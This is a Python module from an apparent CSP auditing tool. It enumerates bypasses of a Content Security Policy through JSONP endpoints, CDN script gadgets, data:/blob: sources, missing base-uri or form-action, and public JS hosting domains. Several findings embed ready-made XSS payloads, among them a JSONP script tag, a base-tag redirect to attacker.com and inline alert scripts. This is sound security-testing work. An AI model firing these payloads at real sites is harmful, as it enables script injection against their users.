"""CSP bypass enumeration engine — finds potential bypasses based on whitelisted domains and sources."""

from __future__ import annotations

import json
from functools import lru_cache
from pathlib import Path

from .models import Finding, Policy, Severity, SourceType
from .parser import parse

_DATA_DIR = Path(__file__).parent / "data"


@lru_cache(maxsize=1)
def _load_jsonp_endpoints() -> dict:
    with open(_DATA_DIR / "jsonp_endpoints.json") as f:
        return json.load(f)


@lru_cache(maxsize=1)
def _load_cdn_gadgets() -> dict:
    with open(_DATA_DIR / "cdn_gadgets.json") as f:
        return json.load(f)


@lru_cache(maxsize=1)
def _load_bypass_patterns() -> dict:
    with open(_DATA_DIR / "bypass_patterns.json") as f:
        return json.load(f)


def find_bypasses(policy: Policy) -> list[Finding]:
    """Enumerate potential CSP bypasses for a given policy."""
    if not policy.directives:
        return []

    findings: list[Finding] = []
    findings.extend(_check_jsonp_bypasses(policy))
    findings.extend(_check_cdn_gadgets(policy))
    findings.extend(_check_data_uri_bypass(policy))
    findings.extend(_check_blob_uri_bypass(policy))
    findings.extend(_check_base_uri_bypass(policy))
    findings.extend(_check_form_action_bypass(policy))
    findings.extend(_check_unsafe_inline_csp2_bypass(policy))
    findings.extend(_check_arbitrary_hosting_bypass(policy))
    return findings


def find_bypasses_header(header: str) -> list[Finding]:
    """Convenience: parse a raw CSP header and find bypasses."""
    return find_bypasses(parse(header))


def check_domain_jsonp(domain: str) -> list[dict]:
    """Look up known JSONP endpoints for a domain."""
    endpoints = _load_jsonp_endpoints()
    domain = domain.lower().strip()
    return endpoints.get(domain, [])


def check_domain_gadgets(domain: str) -> list[dict]:
    """Look up known CDN script gadgets for a domain."""
    gadgets = _load_cdn_gadgets()
    domain = domain.lower().strip()
    return gadgets.get(domain, [])


def _domain_matches(source_host: str, db_domain: str) -> bool:
    """Check if a CSP host source matches a database domain.

    Handles wildcard matching: *.googleapis.com matches maps.googleapis.com
    and also googleapis.com itself.
    """
    source_lower = source_host.lower()
    db_lower = db_domain.lower()

    # Strip scheme if present
    for prefix in ("https://", "http://"):
        if source_lower.startswith(prefix):
            source_lower = source_lower[len(prefix):]

    # Strip port if present
    if ":" in source_lower:
        source_lower = source_lower.rsplit(":", 1)[0]

    # Exact match
    if source_lower == db_lower:
        return True

    # Wildcard source (*.example.com) matches db domain (sub.example.com)
    if source_lower.startswith("*."):
        base = source_lower[2:]
        if db_lower == base or db_lower.endswith("." + base):
            return True

    # Exact source matches wildcard db entry (source maps.googleapis.com, db *.googleapis.com)
    # Not needed — we match source against db keys, not the other way around

    return False


def _get_script_host_sources(policy: Policy) -> list[str]:
    """Extract all host source values from script-src (with default-src fallback)."""
    sources = policy.effective_sources("script-src")
    return [s.raw for s in sources if s.source_type == SourceType.HOST]


# --- Individual bypass checks ---


def _check_jsonp_bypasses(policy: Policy) -> list[Finding]:
    """Check whitelisted domains against known JSONP endpoints."""
    findings = []
    endpoints_db = _load_jsonp_endpoints()
    hosts = _get_script_host_sources(policy)

    for host in hosts:
        for db_domain, endpoints in endpoints_db.items():
            if _domain_matches(host, db_domain):
                for ep in endpoints:
                    findings.append(Finding(
                        severity=Severity.HIGH,
                        title=f"JSONP bypass via {db_domain}",
                        description=(
                            f"The whitelisted source '{host}' matches {db_domain} which has "
                            f"a known JSONP endpoint: {ep['path']}\n"
                            f"Notes: {ep['notes']}\n\n"
                            f"Payload: <script src='https://{db_domain}{ep['path'].replace('CALLBACK', 'alert(document.domain)//')}'></script>"
                        ),
                        directive="script-src",
                        bypass_type="jsonp",
                    ))
    return findings


def _check_cdn_gadgets(policy: Policy) -> list[Finding]:
    """Check whitelisted CDN domains for known script gadgets."""
    findings = []
    gadgets_db = _load_cdn_gadgets()
    hosts = _get_script_host_sources(policy)

    for host in hosts:
        for db_domain, gadgets in gadgets_db.items():
            if _domain_matches(host, db_domain):
                for gadget in gadgets:
                    version_info = ""
                    if gadget.get("max_safe_version"):
                        version_info = f" (versions < {gadget['max_safe_version']})"

                    findings.append(Finding(
                        severity=Severity.HIGH,
                        title=f"Script gadget: {gadget['library']} on {db_domain}{version_info}",
                        description=(
                            f"The whitelisted source '{host}' matches {db_domain} which hosts "
                            f"{gadget['library']}.\n"
                            f"Technique: {gadget['technique']}\n"
                            f"Payload: {gadget['payload']}\n"
                            f"Notes: {gadget['notes']}"
                        ),
                        directive="script-src",
                        bypass_type="cdn_gadget",
                        references=gadget.get("references", []),
                    ))
    return findings


def _check_data_uri_bypass(policy: Policy) -> list[Finding]:
    """Provide concrete bypass payloads if data: is in script-src."""
    sources = policy.effective_sources("script-src")
    if any(s.raw.lower() == "data:" for s in sources):
        patterns = _load_bypass_patterns()
        pattern = patterns.get("data_uri_script", {})
        payloads = pattern.get("payloads", [])
        return [Finding(
            severity=Severity.CRITICAL,
            title="data: URI script injection bypass",
            description=(
                "data: in script-src allows direct script injection.\n\n"
                "Payloads:\n" + "\n".join(f"  {p}" for p in payloads)
            ),
            directive="script-src",
            bypass_type="data_uri",
        )]
    return []


def _check_blob_uri_bypass(policy: Policy) -> list[Finding]:
    """Provide concrete bypass payloads if blob: is in script-src."""
    sources = policy.effective_sources("script-src")
    if any(s.raw.lower() == "blob:" for s in sources):
        patterns = _load_bypass_patterns()
        pattern = patterns.get("blob_uri_script", {})
        payloads = pattern.get("payloads", [])
        return [Finding(
            severity=Severity.HIGH,
            title="blob: URI script injection bypass",
            description=(
                "blob: in script-src allows blob-based script creation (requires existing JS execution).\n\n"
                "Payloads:\n" + "\n".join(f"  {p}" for p in payloads)
            ),
            directive="script-src",
            bypass_type="blob_uri",
        )]
    return []


def _check_base_uri_bypass(policy: Policy) -> list[Finding]:
    """Provide bypass payload if base-uri is missing."""
    if not policy.has_directive("base-uri"):
        patterns = _load_bypass_patterns()
        pattern = patterns.get("base_uri_injection", {})
        payloads = pattern.get("payloads", [])
        return [Finding(
            severity=Severity.MEDIUM,
            title="<base> tag injection (missing base-uri)",
            description=(
                "Without base-uri, injecting a <base> tag redirects all relative URL loads.\n\n"
                "Payload: " + (payloads[0] if payloads else "<base href='https://attacker.com/'>")
            ),
            bypass_type="base_uri",
        )]
    return []


def _check_form_action_bypass(policy: Policy) -> list[Finding]:
    """Provide bypass payload if form-action is missing."""
    if not policy.has_directive("form-action"):
        patterns = _load_bypass_patterns()
        pattern = patterns.get("form_action_hijack", {})
        payloads = pattern.get("payloads", [])
        return [Finding(
            severity=Severity.MEDIUM,
            title="Form hijacking (missing form-action)",
            description=(
                "Without form-action, forms can submit to attacker-controlled endpoints.\n\n"
                "Payloads:\n" + "\n".join(f"  {p}" for p in payloads)
            ),
            bypass_type="form_action",
        )]
    return []


def _check_unsafe_inline_csp2_bypass(policy: Policy) -> list[Finding]:
    """Flag unsafe-inline + nonce/hash as a CSP2 downgrade bypass."""
    sources = policy.effective_sources("script-src")
    has_unsafe_inline = any(s.raw.lower() == "'unsafe-inline'" for s in sources)
    has_nonce_or_hash = any(
        s.source_type in (SourceType.NONCE, SourceType.HASH) for s in sources
    )
    if has_unsafe_inline and has_nonce_or_hash:
        return [Finding(
            severity=Severity.MEDIUM,
            title="CSP2 downgrade: unsafe-inline honored over nonce/hash",
            description=(
                "This policy uses both 'unsafe-inline' and nonce/hash in script-src. "
                "CSP3 browsers ignore unsafe-inline when nonce/hash is present, but "
                "CSP2 browsers (older Chrome, Firefox, Safari) still honor unsafe-inline.\n\n"
                "Payload: <script>alert(document.domain)</script>"
            ),
            directive="script-src",
            bypass_type="csp2_downgrade",
        )]
    return []


_ARBITRARY_HOSTING_DOMAINS = frozenset({
    "raw.githubusercontent.com",
    "cdn.rawgit.com",
    "rawgit.com",
    "gist.githubusercontent.com",
    "pastebin.com",
    "paste.ee",
    "ideone.com",
    "jsbin.com",
    "codepen.io",
    "jsfiddle.net",
    "plnkr.co",
    "surge.sh",
    "netlify.app",
    "vercel.app",
    "pages.dev",
    "workers.dev",
    "web.app",
    "firebaseapp.com",
})


def _check_arbitrary_hosting_bypass(policy: Policy) -> list[Finding]:
    """Flag domains where anyone can host arbitrary JS."""
    findings = []
    hosts = _get_script_host_sources(policy)

    for host in hosts:
        host_lower = host.lower()
        for prefix in ("https://", "http://"):
            if host_lower.startswith(prefix):
                host_lower = host_lower[len(prefix):]
        if ":" in host_lower:
            host_lower = host_lower.rsplit(":", 1)[0]

        for domain in _ARBITRARY_HOSTING_DOMAINS:
            if host_lower == domain or host_lower.endswith("." + domain):
                findings.append(Finding(
                    severity=Severity.CRITICAL,
                    title=f"Arbitrary JS hosting on {domain}",
                    description=(
                        f"The whitelisted source '{host}' allows loading scripts from {domain}, "
                        f"where anyone can host arbitrary content. An attacker can host malicious "
                        f"JS on this domain and load it via the CSP whitelist."
                    ),
                    directive="script-src",
                    bypass_type="arbitrary_hosting",
                ))
                break  # One finding per host

    # Also check wildcard patterns
    for host in hosts:
        host_lower = host.lower()
        if host_lower.startswith("*."):
            base = host_lower[2:]
            for domain in _ARBITRARY_HOSTING_DOMAINS:
                if domain == base or domain.endswith("." + base):
                    findings.append(Finding(
                        severity=Severity.CRITICAL,
                        title=f"Wildcard '{host}' covers arbitrary hosting domain {domain}",
                        description=(
                            f"The wildcard source '{host}' in script-src covers {domain}, "
                            f"where anyone can host arbitrary content."
                        ),
                        directive="script-src",
                        bypass_type="arbitrary_hosting",
                    ))
                    break

    return findings
